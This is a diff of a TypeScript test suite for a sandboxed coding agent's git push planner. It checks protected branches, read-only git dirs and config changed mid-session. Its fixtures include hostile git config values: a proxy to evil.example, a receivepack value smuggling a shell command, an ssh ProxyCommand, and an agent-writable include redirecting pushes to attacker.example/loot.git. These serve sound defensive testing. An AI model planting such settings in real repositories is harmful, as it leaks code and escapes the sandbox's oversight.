@@ -16,11 +16,15 @@ import { SandboxMcpHttp } from "../daemon/sandbox/request-directory.js";
 let root: string;
 let repo: string;
 let bare: string;
+let savedHome: string | undefined;
 const git = (cwd: string, ...args: string[]) =>
   execFileSync("git", args, { cwd, encoding: "utf8", env: { ...process.env, GIT_CONFIG_NOSYSTEM: "1", HOME: root, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } }).trim();
 
 beforeEach(() => {
   root = realpathSync(mkdtempSync(join(tmpdir(), "codeoid-push-")));
+  // The daemon's git reads HOME's ~/.gitconfig as "your global config": here, a scratch one.
+  savedHome = process.env.HOME;
+  process.env.HOME = root;
   bare = join(root, "remote.git");
   repo = join(root, "work", "repo");
   mkdirSync(repo, { recursive: true });
@@ -36,9 +40,13 @@ beforeEach(() => {
   git(repo, "add", ".");
   git(repo, "commit", "-q", "-m", "second");
 });
-afterEach(() => rmSync(root, { recursive: true, force: true }));
+afterEach(() => {
+  process.env.HOME = savedHome;
+  rmSync(root, { recursive: true, force: true });
+});
 
-const opts = () => ({ protectedBranches: ["main", "master"], home: root, _testFileRemote: true });
+/** As a session passes them: the repository's git dir held read-only, the workspace the agent's to write. */
+const opts = () => ({ protectedBranches: ["main", "master"], home: root, _testFileRemote: true, heldReadOnly: [join(repo, ".git")], agentWritable: [repo, join(root, "scratch")] });
 const plan = async (input: Parameters<typeof planPush>[1] = {}, o: Partial<Parameters<typeof planPush>[2]> = {}) => planPush(repo, input, { ...opts(), ...o });
 const planned = async (input: Parameters<typeof planPush>[1] = {}): Promise<PushPlan> => {
   const p = await plan(input);
@@ -54,7 +62,7 @@ const refusal = async (input: Parameters<typeof planPush>[1] = {}, o: Partial<Pa
 describe("push: the plan", () => {
   test("the checked-out branch, as its commit now, to origin's URL from the repository's own config", async () => {
     const p = await planned();
-    expect(p).toMatchObject({ branch: "feature/x", remote: "origin", url: `file://${bare}`, sha: git(repo, "rev-parse", "HEAD"), ahead: 1 });
+    expect(p).toMatchObject({ branch: "feature/x", remote: "origin", url: `file://${bare}`, sha: git(repo, "rev-parse", "HEAD"), sshCommand: null, defaultUnknown: false });
   });
 
   test("never main, master, a protected pattern, or the remote's default branch", async () => {
@@ -62,6 +70,12 @@ describe("push: the plan", () => {
     expect(await refusal()).toContain("protected branch");
     expect(await refusal({ branch: "feature/x" }, { protectedBranches: ["feature/*"] })).toContain("protected branch");
     expect(await refusal({ branch: "feature/x" }, { remoteDefault: async () => "feature/x" })).toContain("the remote's default branch");
+    expect(await refusal({ branch: "feature/x" }, { remoteDefault: async () => "Feature/X" })).toContain("the remote's default branch");
+    expect(await refusal({ branch: "feature/x" }, { protectedBranches: ["FEATURE/*"] })).toContain("protected branch");
+    // The default couldn't be read: the plan says so (the session refuses it in autonomous mode, and says it on the card).
+    expect(await planned({ branch: "feature/x" })).toMatchObject({ defaultUnknown: false });
+    const unknown = await plan({ branch: "feature/x" }, { remoteDefault: async () => null });
+    expect("refused" in unknown ? null : unknown.defaultUnknown).toBe(true);
     expect(branchMatches("release/*", "release/1.2")).toBe(true);
     expect(branchMatches("release/*", "releases")).toBe(false);
   });
@@ -87,6 +101,35 @@ describe("push: the plan", () => {
     // The repository's own config is the user's (read-only to sandboxed commands): its settings are taken.
     git(repo, "config", "http.postBuffer", "1048576");
     expect("refused" in (await plan())).toBe(false);
+    // But never, from there, what turns a push into a leak or a remote command.
+    for (const [k, v] of [["http.proxy", "http://evil.example:1"], ["http.sslVerify", "false"], ["http.https://x.example/.extraHeader", "X: y"], ["remote.origin.receivepack", "touch /tmp/x; git-receive-pack"], ["core.sshCommand", "ssh -o ProxyCommand=evil"], ["credential.username", "x"]] as const) {
+      git(repo, "config", k, v);
+      expect([k, await refusal()]).toEqual([k, expect.stringContaining("never uses for a push it makes")]);
+      git(repo, "config", "--unset", k);
+    }
+  });
+
+  test("round 1: a repository whose config the sandbox doesn't hold, or that was made or changed after the session began, decides nothing", async () => {
+    expect(await refusal({}, { heldReadOnly: [] })).toContain("aren't held read-only by this session's sandbox");
+    expect(await refusal({}, { heldReadOnly: [join(root, "elsewhere")] })).toContain("aren't held read-only");
+    // The session began after the repository's config was written: fine. Before it (a `git init` or a `git config` since): refused.
+    expect("refused" in (await plan({}, { notChangedSince: Date.now() + 60_000 }))).toBe(false);
+    expect(await refusal({}, { notChangedSince: Date.now() - 60_000 })).toContain("made or changed after this session began");
+    // An empty config.worktree (codeoid makes one when it holds the git dir) changes nothing.
+    const began = Date.now() + 1;
+    await Bun.sleep(5);
+    writeFileSync(join(repo, ".git", "config.worktree"), "");
+    expect("refused" in (await plan({}, { notChangedSince: began }))).toBe(false);
+  });
+
+  test("round 1: an include of your global config that the agent can write decides nothing; your own ssh command is used", async () => {
+    mkdirSync(join(root, "scratch"), { recursive: true });
+    const team = join(root, "scratch", "team.gitconfig");
+    writeFileSync(team, '[remote "origin"]\n\tpushurl = ssh://git@attacker.example/loot.git\n');
+    writeFileSync(join(root, ".gitconfig"), `[include]\n\tpath = ${team}\n`);
+    expect(await refusal()).toContain("a file this session's agent can write");
+    writeFileSync(join(root, ".gitconfig"), "[core]\n\tsshCommand = ssh -i ~/.ssh/work_key\n");
+    expect(await planned()).toMatchObject({ sshCommand: "ssh -i ~/.ssh/work_key" });
   });
 
   test("only ssh and https remotes are pushed to for real; two push URLs, or borrowed objects, are refused", async () => {
@@ -139,6 +182,16 @@ describe("push: the run", () => {
     expect(r.ok).toBe(true);
     expect(existsSync(marker)).toBe(false);
     expect(git(bare, "rev-parse", "refs/heads/feature/x")).toBe(p.sha);
+  });
+
+  test("round 1: borrowed objects that appear after the plan stop the push; a stop kills it, and says the remote may have it", async () => {
+    const p = await planned();
+    writeFileSync(join(repo, ".git", "objects", "info", "alternates"), "/elsewhere/objects\n");
+    expect(await runPush(p, 60_000, true)).toMatchObject({ ok: false, summary: expect.stringContaining("borrows objects") });
+    rmSync(join(repo, ".git", "objects", "info", "alternates"));
+    const stopped = new AbortController();
+    stopped.abort();
+    expect(await runPush(p, 60_000, true, stopped.signal)).toMatchObject({ ok: false, summary: expect.stringContaining("closing") });
   });
 
   test("a remote branch with commits ours doesn't have: refused by the remote, never forced, and the agent is told what to do", async () => {
